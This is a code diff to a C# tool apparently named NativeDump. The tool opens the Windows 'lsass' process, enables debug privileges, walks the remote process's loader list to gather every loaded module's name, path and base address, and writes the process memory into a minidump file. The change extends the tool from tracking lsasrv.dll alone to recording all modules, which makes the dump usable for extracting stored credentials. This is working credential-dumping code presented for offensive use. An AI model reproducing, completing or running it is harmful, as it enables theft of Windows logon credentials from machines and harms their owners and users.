@@ -7,6 +7,22 @@ using static NativeDump.CreateFile;
 
 namespace NativeDump
 {
+    public class ModuleInformation
+    {
+        public string Name { get; set; }
+        public string FullPath { get; set; }
+        public IntPtr Address { get; set; }
+        public int Size { get; set; }
+
+        public ModuleInformation(string name, string fullpath, IntPtr address, int size)
+        {
+            Name = name;
+            FullPath = fullpath;
+            Address = address;
+            Size = size;
+        }
+    }
+
     internal class Program
     {
         static void EnableDebugPrivileges()
@@ -77,24 +93,17 @@ namespace NativeDump
         }
 
 
-        public unsafe static IntPtr CustomGetModuleHandle(IntPtr hProcess, String dll_name)
+        public unsafe static List<ModuleInformation> CustomGetModuleHandle(IntPtr hProcess)
         {
+            List<ModuleInformation> moduleInformationList = new List<ModuleInformation>();
+
             uint process_basic_information_size = 48;
             int peb_offset = 0x8;
             int ldr_offset = 0x18;
             int inInitializationOrderModuleList_offset = 0x30;
             int flink_dllbase_offset = 0x20;
+            int flink_buffer_fulldllname_offset = 0x40;
             int flink_buffer_offset = 0x50;
-            // If 32-bit process these offsets change
-            if (IntPtr.Size == 4)
-            {
-                process_basic_information_size = 24;
-                peb_offset = 0x4;
-                ldr_offset = 0x0c;
-                inInitializationOrderModuleList_offset = 0x1c;
-                flink_dllbase_offset = 0x18;
-                flink_buffer_offset = 0x30;
-            }
 
             // Create byte array with the size of the PROCESS_BASIC_INFORMATION structure
             byte[] pbi_byte_array = new byte[process_basic_information_size];
@@ -134,18 +143,15 @@ namespace NativeDump
                 // Get DLL base address
                 dll_base = ReadRemoteIntPtr(hProcess, (next_flink + flink_dllbase_offset));
                 IntPtr buffer = ReadRemoteIntPtr(hProcess, (next_flink + flink_buffer_offset));
-
+                // DLL base name
                 string base_dll_name = ReadRemoteWStr(hProcess, buffer);
+                // DLL full path
+                string full_dll_path = ReadRemoteWStr(hProcess, ReadRemoteIntPtr(hProcess, (next_flink + flink_buffer_fulldllname_offset)));
 
+                moduleInformationList.Add(new ModuleInformation(base_dll_name.ToLower(), full_dll_path, dll_base, 0));        
                 next_flink = ReadRemoteIntPtr(hProcess, (next_flink + 0x10));
-                
-                // Compare with DLL name we are searching
-                if (dll_name.ToLower() == base_dll_name.ToLower())
-                {
-                    return dll_base;
-                }
             }
-            return IntPtr.Zero;
+            return moduleInformationList;
         }
 
 
@@ -153,7 +159,7 @@ namespace NativeDump
         {
             // Get process name
             string procname = "lsass";
-            
+
             //Get process PID
             Process[] process_list = Process.GetProcessesByName(procname);
             if (process_list.Length == 0)
@@ -186,10 +192,10 @@ namespace NativeDump
             byte[] memory_regions = { };
             List<Memory64Info> mem64info_List = new List<Memory64Info>();
 
-            // Get lsasrv.dll information
-            IntPtr lsasrvdll_address = CustomGetModuleHandle(processHandle, "lsasrv.dll");
-            int lsasrvdll_size = 0;
-            bool bool_test = false;
+            // Get modules information
+            List<ModuleInformation> moduleInformationList = CustomGetModuleHandle(processHandle);
+            int aux_size = 0;
+            string aux_name = "";
 
             while ((long)mem_address < proc_max_address_l)
             {
@@ -222,22 +228,27 @@ namespace NativeDump
                     Buffer.BlockCopy(buffer, 0, new_bytearray, memory_regions.Length, buffer.Length);
                     memory_regions = new_bytearray;
 
-                    // Calculate size of lsasrv.dll region
-                    if (mbi.BaseAddress == lsasrvdll_address)
+                    ModuleInformation aux_module = moduleInformationList.Find(obj => obj.Name == aux_name);
+                    
+                    if ((int)mbi.RegionSize == 0x1000 && mbi.BaseAddress != aux_module.Address)
                     {
-                        bool_test = true;
+                        aux_module.Size = aux_size;
+                        int aux_index = moduleInformationList.FindIndex(obj => obj.Name == aux_name);
+                        moduleInformationList[aux_index] = aux_module;
+                        
+                        foreach (ModuleInformation modInfo in moduleInformationList)
+                        {
+                            if (mbi.BaseAddress == modInfo.Address)
+                            {
+                                aux_name = modInfo.Name.ToLower();
+                                aux_size = (int)mbi.RegionSize;
+                            }
+                        }
                     }
-                    if (bool_test == true)
+                    else
                     {
-                        if ((int)mbi.RegionSize == 0x1000 && mbi.BaseAddress != lsasrvdll_address)
-                        {
-                            bool_test = false;
-                        }
-                        else
-                        {
-                            lsasrvdll_size += (int)mbi.RegionSize;
-                        }
-                    }
+                        aux_size += (int)mbi.RegionSize;
+                    }                    
                 }
                 // Next memory region
                 mem_address = (IntPtr)((ulong)mem_address + (ulong)mbi.RegionSize);
@@ -251,9 +262,7 @@ namespace NativeDump
             }
 
             // Generate Minidump file
-            Console.WriteLine("[+] Lsasrv.dll Address:\t\t\t\t0x" + lsasrvdll_address.ToString("X"));
-            Console.WriteLine("[+] Lsasrv.dll Size:   \t\t\t\t0x" + lsasrvdll_size.ToString("X"));
-            CreateMinidump(lsasrvdll_address, lsasrvdll_size, mem64info_List, memory_regions, dumpfile);
+            CreateMinidump(moduleInformationList, mem64info_List, memory_regions, dumpfile);
 
             // Close process handle
             ntstatus = NtClose(processHandle);
